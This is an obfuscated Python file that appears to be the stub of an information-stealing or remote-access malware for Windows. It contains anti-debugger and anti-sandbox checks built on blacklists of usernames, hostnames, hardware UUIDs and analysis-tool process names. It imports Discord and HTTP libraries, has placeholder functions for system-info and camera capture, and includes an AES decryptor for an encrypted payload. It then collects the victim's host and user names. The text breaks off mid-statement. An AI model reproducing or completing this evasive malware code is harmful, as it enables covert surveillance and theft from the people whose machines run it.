
def YWCDDEEMMCBQRISOAKPOPTWIKYXRVKLHJURQJZCHGEAVXQMGDRMSOQSXKVRBUZZDMHSJ():
    import os
    import socket
    import subprocess
    import ctypes
    import sys
    import psutil

    IVZZLWMPUSNJSSTBJKYITMBUFRREYURDQAXMZSOFMGEWYPETVC = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'Bruno' 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', 'stephpie']
    FFHBHAKNGEJQXZDIQSPHCAOPPIBOYYQYBREWIFZHIQCECOEEPSYBIYDWRGLZAMULYGDGETHIUVZJXRNOTZ = ['0CC47AC83802', 'BEE7370C-8C0C-4', 'DESKTOP-ET51AJO', '965543', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42', 'test']
    KDXJZNAXILCPZYMGGFZDLQYXRCYDGKYPOOCRLXOMXJBXCMQBFEBRTNFSZKW     = ['671BC5F7-4B0F-FF43-B923-8B1645581DC8', '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
    OBMLILWJYVXTTIUGSTHTIUKJMISSASLDXKDUGQAKDEJNAEFGZSIUNVAAWRAKOUNAUBAHSCJCRW   = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb', 'debugger', 'visual studio debugger', 'lldb', 'gdb', 'valgrind', 'hex-rays', 'disassembler', 'tracer', 'debugview', 'procdump', 'strace', 'ltrace', 'drmemory', 'decompiler', 'hopper', 'binary ninja', 'bochs', 'vdb', 'frida', 'api monitor', 'process hacker', 'sysinternals', 'procexp', 'process explorer', 'monitor tool', 'vmmap', 'xperf', 'perfview', 'py-spy', 'strace-log']

    try:
        if sys.gettrace() is not None:
            return True
    except: pass

    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except: pass

    try:
        for v4r_proc in psutil.process_iter(['name']):
            try:
                EIRDRSOPYAWIEOEKHRJGXSHVCGAQHWXFIQAXJYWBPJZCLHASSYCDAYHI = str(v4r_proc.info['name']).lower()
                if any(debugger in EIRDRSOPYAWIEOEKHRJGXSHVCGAQHWXFIQAXJYWBPJZCLHASSYCDAYHI for debugger in OBMLILWJYVXTTIUGSTHTIUKJMISSASLDXKDUGQAKDEJNAEFGZSIUNVAAWRAKOUNAUBAHSCJCRW):
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
            continue
    except: pass

    try:
        if os.getlogin() in IVZZLWMPUSNJSSTBJKYITMBUFRREYURDQAXMZSOFMGEWYPETVC:
            return True
        elif os.getlogin().lower() in [v4r_u53rn4m3.lower() for v4r_u53rn4m3 in IVZZLWMPUSNJSSTBJKYITMBUFRREYURDQAXMZSOFMGEWYPETVC]:
            return True
    except: pass

    try:
        if socket.gethostname() in FFHBHAKNGEJQXZDIQSPHCAOPPIBOYYQYBREWIFZHIQCECOEEPSYBIYDWRGLZAMULYGDGETHIUVZJXRNOTZ:
            return True
        elif socket.gethostname().lower() in [v4r_h05tn4m3.lower() for v4r_h05tn4m3 in FFHBHAKNGEJQXZDIQSPHCAOPPIBOYYQYBREWIFZHIQCECOEEPSYBIYDWRGLZAMULYGDGETHIUVZJXRNOTZ]:
            return True
    except: pass

    try: 
        if subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip() in KDXJZNAXILCPZYMGGFZDLQYXRCYDGKYPOOCRLXOMXJBXCMQBFEBRTNFSZKW:
            return True
    except: pass

    return False

try: HBAMGUYEEZXDDENACPXXHKTIBTZAAQOINOKTPFIWTGIKNGQGUVMSJNXDCWZTRIFPXWLBPSCFMFSMRAKGOIFSYFYLRUKZ = YWCDDEEMMCBQRISOAKPOPTWIKYXRVKLHJURQJZCHGEAVXQMGDRMSOQSXKVRBUZZDMHSJ()
except: HBAMGUYEEZXDDENACPXXHKTIBTZAAQOINOKTPFIWTGIKNGQGUVMSJNXDCWZTRIFPXWLBPSCFMFSMRAKGOIFSYFYLRUKZ = False

if HBAMGUYEEZXDDENACPXXHKTIBTZAAQOINOKTPFIWTGIKNGQGUVMSJNXDCWZTRIFPXWLBPSCFMFSMRAKGOIFSYFYLRUKZ == True:
    import sys
    sys.exit()

import sys

def RFJZTFAYYVEYOWQHHRCSXXVWFFAEQDZPXOMMWRWXBKPUAHQWTJWUOXHCYGQCBQKETYRRZUEVHU():
    def SFBPXCDTPZWNIWHSLOUAQGDGGHSDYVWVKGMGIUTQMFPQPUMNVLPPML():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR = SFBPXCDTPZWNIWHSLOUAQGDGGHSDYVWVKGMGIUTQMFPQPUMNVLPPML()
        if MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR == True:
            return MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR
    except:
        return True
    
if RFJZTFAYYVEYOWQHHRCSXXVWFFAEQDZPXOMMWRWXBKPUAHQWTJWUOXHCYGQCBQKETYRRZUEVHU() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def EGTKBTIGJFMLNOSNNQJQQLTDABEMQVNYZLBSWWDWFYLVUWBVLJJRQBL(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT): 
    MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_system_info = None
    return MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_system_info

def DIBGEOWRGKSEAFMXIFUVRDOCXAULLPLZUFQLJSPMITIPBEXUUDYJZRNKYMKYHXZALUWORJQPEHOHOQLVVYJ(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT):
    LVBHSDGVISAOFNXECQVBSNZGYAEHZWBEUYEUAWNKCRWUWZITSCTXWXFIVUULQLDOHIUUJYUSKCCPXUPXBZ = None
    return LVBHSDGVISAOFNXECQVBSNZGYAEHZWBEUYEUAWNKCRWUWZITSCTXWXFIVUULQLDOHIUUJYUSKCCPXUPXBZ

def UTNSRPLYYTEYDMRKLYDJBHIJVUZHBATXJNHPCEEPVYIMDKSONRYKTFHFUGNHVMKJPKAHOKHPQYAMWZWXBYBZQIJWVNCUAYJBSDM(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT):
    CSGWQNYOPUUJUKJYRLYLLDRJAMEBYWUGAXDOSWZGJROQHYSSXSMCNZ = None
    return CSGWQNYOPUUJUKJYRLYLLDRJAMEBYWUGAXDOSWZGJROQHYSSXSMCNZ

def FFDZXZNIFUJEZDMBSIVTPCTFJVAKLKUBRRJKIKVVJNPAWBYNHPPGYGNBEMGCYKCRCBIIUKHBMOSLCDZOFRDAJUQLYKGWH(): 
    FFINAXAURGQGKCPFDVSBNGUAJJLFDUQPBISTNRVNUCZZVGFBUEXSQXZDZJAQCHQY = None
    return FFINAXAURGQGKCPFDVSBNGUAJJLFDUQPBISTNRVNUCZZVGFBUEXSQXZDZJAQCHQY

def RNATGZQLGLKBFCVWWNGENRVGNPDGFCSRZGSQVJTJDKIFZAJDTIFQWWFWTOAOAMMCHMUQYLPDDRRO(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT): 
    YGIBLHTDRVQNOCHHJQRJEYIYXRPUMFUHJEJLDCLNFTIDJENPCUHLFBMIDE = None
    LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA = None
    KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ = None
    MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM = None
    KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT = None
    UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD = None
    return YGIBLHTDRVQNOCHHJQRJEYIYXRPUMFUHJEJLDCLNFTIDJENPCUHLFBMIDE, LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA, KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ, MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM, KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT, UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD

def ERZBOVJUDQWKNKHPPOAJIVZDYCOCPDZWTLGPTMARVCWKBNNITVWRULLBTZXIRFUPMUKKLNNERGNYEJCKQJGVKJOQYJXBWLCHI(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT):
    BDSYFJWYTEIAWZCGBZCUWXCEVALQSNBEASZOBYFMWHSSRBSRBVVTZRFLBJLLXFIWQBWM = None
    YOBBMITFYTRGPQRBPFDJMMDCKLXEWBTZTROYEOSHUIAZFHSVYQ = None
    QQDVRMHCBLNNJIONXKYGMYERZUGYOESQEJYDRUAPBIZALTIUKACZIOZTJCETSCBDTOYBFWHONYSIXQQMXLZBYPH = None
    return BDSYFJWYTEIAWZCGBZCUWXCEVALQSNBEASZOBYFMWHSSRBSRBVVTZRFLBJLLXFIWQBWM, YOBBMITFYTRGPQRBPFDJMMDCKLXEWBTZTROYEOSHUIAZFHSVYQ, QQDVRMHCBLNNJIONXKYGMYERZUGYOESQEJYDRUAPBIZALTIUKACZIOZTJCETSCBDTOYBFWHONYSIXQQMXLZBYPH

def JTQFHFNLMVNTIKLIZLDNNDYFEEXICZTREIWUQFRJURITVUBPFXUMVEVTGZDTQLLPVIFFGGEAUNHQKCDJOQOTFRAZGMVAJB(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT):
    MWIKAZDZESBWGLWXWWGBLKSRPUHLVHDKGVHQTYXNSFZYPZNHURBDKEHCQEJPW = None
    return MWIKAZDZESBWGLWXWWGBLKSRPUHLVHDKGVHQTYXNSFZYPZNHURBDKEHCQEJPW

def PRCXCFHJGCLQAVKGABNUUOMVTMSUFTZLFVDRFTOCGMBBDOWRLETYBPHHNTOKBWIDUIQPYPNAJEHHSVQQLITMBSKG(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT):
    MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture = None
    return MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_camera_capture

def ZSBWPKJHAAVTJHGBHKKCCWMPGPNKOVOILSGZHKJBWAKXYYSEOXZVOHHXFWBLCYLDRTGUQDHUDC(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT): 
    WALGTAYTADYXQPRNSHQECYTBVHHPKZCDWDBLCXDTBARUDGPUGSSBIAK = None
    return WALGTAYTADYXQPRNSHQECYTBVHHPKZCDWDBLCXDTBARUDGPUGSSBIAK

def BABGYMQDWWZTXYRANFXSNNWBTCRQAHWFRSMOIDDHTLYGNLOIRYYCYXHMWBRSJNTWRAODJISRCZPOIAZSVU(): pass
def RAYPJGEKTJUNIKEXHBLYCNDWKZLURGQTCAMBDSUGFQCOTHLEZQX(): pass
def RHOFYVYNDQAQMYJEQDCSREYEZRQKABZDSMSQRTASBAHSPQQWGRXAXFOFLKZNUZZNBMMRFKRLUANXXBKQTPDKOUTBCCMTIRDOO(): pass
def DIASDXENYGJKTCQMNNWSGTPDNZQEQJILADWCGXKQOZTXRJXMOQVURZNSVIRQTZSAOHGDCYMKFVAGPMLRDYSABJBI(): pass
def ZTOZMACREVUBMZREOESEMPFLNKRAZBYIEWFGMGXUPHLYBBYGOQYUTUWGOUXXNNROXCJHKOCFMRVECNNANLMLQPJC(): pass
def SCNWBIZFMDECDRAFUOTPJXSKIDTKXOXAKNPLWMXGENCFLHCMTZDZVZKBPVHVVMIHEZTOQJWMMFJKLIKXZFCNAYDYBOQRTCQQMYWU(): pass
def VUVPKEWFBFKQJKWTAIIPRTDSQJWTVDQDIZWPVCMOEEJDYXEZRJGACAOOPEPQSBU(): pass
def LOPJBNQDFQQKDRFMBCDAGTQAAHATAFBARTZYSFMBTSMOCLOSVDBPFQRNPHPYOGITXTUZNDIAXSVIOXFBUMXIOT(): pass
def CDLFWTNXYEZAXDSRXSQOGFUDCPMCNINFJLEYJAIRNDSOWEEUPIQLKLDBRNIOKGLLARSYXMM(): pass
def EVSKPOFKKALENOWIDTYJHSJJCOJNSTYTWDKUIEDRBDPETKINVONBAJUAHNRLHVCNMTHIUZBRSKIIFTAOENXPV(): pass
def FZMJGYDFKWYQQVTOWNOQBLVYEIQNJLKAPPQRBRWICWMMOCGUTZIPGYZJSYILHJKKNYKJYRVFNV(): pass
def FITWQQZSGCJAEJRKTYUQMUAMMWSPQAXJSKRPAPGIHOQRVNYXEJHTNMJNSJD(): pass

def UAUCFGOUOHKAPNWDDPUMYIGKOBTBRXLNWOXILQDVWAMXDKHFVHNOIPEBRJDILGMKUXGBWERKHJFUINMOEVHCWZGUZP(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def UOAVJUXJTEJYTBJEKSJYSPNBVSLVZWQSUIVWMJZRGIZONVPEOUTLFDQGNWYJTOPHCEFFVZPOTEVLKOLUJTUHUPEOSCKSRSQ():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def VOCDSHTBSNYGSKYEWUZBQUZHANBWPXSKNQOAFQKYENXJPVWKYVPKOUJHUAEMXNRPTOEJXSDMPSXYEFQMEWVA(JNMFNCQDOWYQVWMIUPINZLFKRSJRXYLYVICZSCRPNFTOOQCGVWHJ, GWQSWGOIEZMKCTPFUOCYMCKKWGQLZHZHVKAPHCSVBSQGLWZYMHTJSGLYEOZMMPKIAGUJP):
    def ENIEJLXEUMIXXPCHIQFXGCXANYRMGFLEFNKIDHOGSPOAXSZSWPBXSNJ(MUKBGPZWFRCQOREIJXPNKEFUFGTZVKOXVVSVWZYNHDPKIJXZRFNCRQSVGITQTNRHTRNTGIANAULKRDCFROWTXNEDOATUQJVL, GTHIGEOSCACHYHFXVCYEOFMTTCTKJTSPNGFMTXGKQRQLUSMKUDTHDVJUPCORMTCDBNY):
        XKQPKKQWUZLWIEJYZVPPTCHDLUFTWPDBAYVIRJLGRFOVHENEVOBRROVKGFCBWWCQOKEWCYNDRCSKCBONBAVOL = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=GTHIGEOSCACHYHFXVCYEOFMTTCTKJTSPNGFMTXGKQRQLUSMKUDTHDVJUPCORMTCDBNY, iterations=100000, backend=default_backend())
        if isinstance(MUKBGPZWFRCQOREIJXPNKEFUFGTZVKOXVVSVWZYNHDPKIJXZRFNCRQSVGITQTNRHTRNTGIANAULKRDCFROWTXNEDOATUQJVL, str):  
            MUKBGPZWFRCQOREIJXPNKEFUFGTZVKOXVVSVWZYNHDPKIJXZRFNCRQSVGITQTNRHTRNTGIANAULKRDCFROWTXNEDOATUQJVL = MUKBGPZWFRCQOREIJXPNKEFUFGTZVKOXVVSVWZYNHDPKIJXZRFNCRQSVGITQTNRHTRNTGIANAULKRDCFROWTXNEDOATUQJVL.encode()  
        return XKQPKKQWUZLWIEJYZVPPTCHDLUFTWPDBAYVIRJLGRFOVHENEVOBRROVKGFCBWWCQOKEWCYNDRCSKCBONBAVOL.derive(MUKBGPZWFRCQOREIJXPNKEFUFGTZVKOXVVSVWZYNHDPKIJXZRFNCRQSVGITQTNRHTRNTGIANAULKRDCFROWTXNEDOATUQJVL)

    JNMFNCQDOWYQVWMIUPINZLFKRSJRXYLYVICZSCRPNFTOOQCGVWHJ_data = base64.b64decode(JNMFNCQDOWYQVWMIUPINZLFKRSJRXYLYVICZSCRPNFTOOQCGVWHJ)
    GTHIGEOSCACHYHFXVCYEOFMTTCTKJTSPNGFMTXGKQRQLUSMKUDTHDVJUPCORMTCDBNY = JNMFNCQDOWYQVWMIUPINZLFKRSJRXYLYVICZSCRPNFTOOQCGVWHJ_data[:16]
    PPTUVGGXQUXGSLVMJITKSXGUKFBKQNJUJQNCNHWZGFVYQPOOIYYNSPYBAS = JNMFNCQDOWYQVWMIUPINZLFKRSJRXYLYVICZSCRPNFTOOQCGVWHJ_data[16:32]
    JNMFNCQDOWYQVWMIUPINZLFKRSJRXYLYVICZSCRPNFTOOQCGVWHJ_data = JNMFNCQDOWYQVWMIUPINZLFKRSJRXYLYVICZSCRPNFTOOQCGVWHJ_data[32:]
    TGMCTUMYBHLDEQQGSJXMAXBHTDVWIRTZNREDSBMWXYOYCCLIFLLOPCMJCSBONJAPXHBNVKFCCS = ENIEJLXEUMIXXPCHIQFXGCXANYRMGFLEFNKIDHOGSPOAXSZSWPBXSNJ(GWQSWGOIEZMKCTPFUOCYMCKKWGQLZHZHVKAPHCSVBSQGLWZYMHTJSGLYEOZMMPKIAGUJP, GTHIGEOSCACHYHFXVCYEOFMTTCTKJTSPNGFMTXGKQRQLUSMKUDTHDVJUPCORMTCDBNY)
    FPFUUNECYWIJAUNBEUEUAOFFDBXOVRKEKBOSBWBWEYQLAVPQKPUTEUEREZHUGMJFUYVWVYCNIDOAHPEOEJIO = Cipher(algorithms.AES(TGMCTUMYBHLDEQQGSJXMAXBHTDVWIRTZNREDSBMWXYOYCCLIFLLOPCMJCSBONJAPXHBNVKFCCS), modes.CBC(PPTUVGGXQUXGSLVMJITKSXGUKFBKQNJUJQNCNHWZGFVYQPOOIYYNSPYBAS), backend=default_backend())
    NRRXXTZMHAWOUVEVJKSDVJZLEWVWVJUJFVWHKWSKKUFJIOUOTTVXWAGAKYHHWTAIRNPQBZXBOQMPPNXG = FPFUUNECYWIJAUNBEUEUAOFFDBXOVRKEKBOSBWBWEYQLAVPQKPUTEUEREZHUGMJFUYVWVYCNIDOAHPEOEJIO.decryptor()
    JMIJNALOTYUGPCWZMJAZUHLMXKHPNLFEAYHJKSVXECHGEUDFXFCFARPYKBS = NRRXXTZMHAWOUVEVJKSDVJZLEWVWVJUJFVWHKWSKKUFJIOUOTTVXWAGAKYHHWTAIRNPQBZXBOQMPPNXG.update(JNMFNCQDOWYQVWMIUPINZLFKRSJRXYLYVICZSCRPNFTOOQCGVWHJ_data) + NRRXXTZMHAWOUVEVJKSDVJZLEWVWVJUJFVWHKWSKKUFJIOUOTTVXWAGAKYHHWTAIRNPQBZXBOQMPPNXG.finalize()
    RQFQDNDBEGNXDBTXFGAFJSIPKEMWCVFTNQDQVAMPGUVLKXTYSLGIIRDCPGDMYULOVFTQHPY = padding.PKCS7(128).unpadder()
    VIVOAVQDLPDPZBALPIXKLBJBLLWSTQKMXJJASKJJHEWYQKAJNIBJNRSJVJPOBVSFFSBNWUBMGOJKREDHUYLLDTTATDO = RQFQDNDBEGNXDBTXFGAFJSIPKEMWCVFTNQDQVAMPGUVLKXTYSLGIIRDCPGDMYULOVFTQHPY.update(JMIJNALOTYUGPCWZMJAZUHLMXKHPNLFEAYHJKSVXECHGEUDFXFCFARPYKBS) + RQFQDNDBEGNXDBTXFGAFJSIPKEMWCVFTNQDQVAMPGUVLKXTYSLGIIRDCPGDMYULOVFTQHPY.finalize()
    return VIVOAVQDLPDPZBALPIXKLBJBLLWSTQKMXJJASKJJHEWYQKAJNIBJNRSJVJPOBVSFFSBNWUBMGOJKREDHUYLLDTTATDO.decode()

UAUCFGOUOHKAPNWDDPUMYIGKOBTBRXLNWOXILQDVWAMXDKHFVHNOIPEBRJDILGMKUXGBWERKHJFUINMOEVHCWZGUZP("")

try: WRKKJDYVKEKQDDHPNDCSLKSGGVUNSHXCIZGTHGOLAQLUCYAZFCJLRMAVBECJOPIFQLDCVTYBSCEDCZUZSMEWVRT    = socket.gethostname()
except: WRKKJDYVKEKQDDHPNDCSLKSGGVUNSHXCIZGTHGOLAQLUCYAZFCJLRMAVBECJOPIFQLDCVTYBSCEDCZUZSMEWVRT = "None"

try: SZCNPOJILKSWMCXDBUMAUATSVEIKOJTLIPJNALNKJHWLNUFRLOFMJEITFPHIUOYDMSYB    = os.getlogin()
except: SZCNPOJILKSWMCXDBUMAUATSVEIKOJTLIPJNALNKJHWLNUFRLOFMJEITFPHIUOYDMSYB = "None"

try: HMXCICLUUUAZJSNJJPRWKUKWNNYLRFZZOKVVUFRMISGDMHDSNIUKNALUGSBUSRSMAYRPZIOFBGFOFJBMOVBMTDYCSUXDD    = win32api.GetUserNameEx(win32api.NameDisplay)
